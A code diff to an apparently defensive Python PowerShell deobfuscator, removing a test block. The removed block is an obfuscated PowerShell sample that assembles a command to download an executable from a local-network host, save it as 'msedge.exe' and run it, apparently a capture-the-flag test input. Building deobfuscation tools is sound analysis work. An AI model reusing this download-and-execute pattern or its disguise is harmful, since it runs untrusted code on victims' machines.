@@ -358,34 +358,3 @@ def deobfuscate(code):
     except:
         code = "Something's wrong with the code or input!"
     return code,httplist,iplist
-
-testing = """"
-$tes = [StRing][Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13);
-$tes2 += [ChaR](98   -  10  - 10 + 1) + [CHAR](109 -bxor   4);
-$tes2 = [StRing][ChaR](99   -  10  - 10 + 1)         +          [CHAR](109 -bxor   4);
-$tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4);
-$tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)';
-$tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4);
-$tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
-$tesss = pe
-$tesss += [ChaR](100   -  10  - 10 + 1) + [CHAR](109 -bxor   4) + $tes7 + a
-$tes8 = $tesss + [CHAR](109 -bxor   3)
-$s10 = $tesss + [CHAR](109 -bxor   3)
-$a = FromBase64STrinG
-$b = SGVsbG8gd29ybGQh==
-$decodedBytes = [System.Convert]::$a(($b))
-$tes9 = [CHAr](109 + 2) + $tes + '`b`b' + [CHAR](109 -bxor   5) + `naaaa
-$aa = "ayam goreng enak loh"
-$bb = a + $aa
-$u=$v='ht'+'tp://192.168.0.16:8282/warrB64_deC'    +   'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3Dwarrr/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{};$abbbb    =     $decodedBytes 
-aGFsbyBnZXMgd2VsY29tZSB0byB5b3V0dWJlIGNoYW5uZWwgbXk==
-$bb += $tes2.rePLAce('Pi','Pia Baturiti')
-$cc = $tes.rePLAce('FY','GX').replace('m','aa ').REPLaCE('aa ','default')
-"""
-
-code,httplist,iplist = deobfuscate(testing)
-print(code)
-
-
-#TO-DO: pelajarin decode lainnya, pola backslash
-
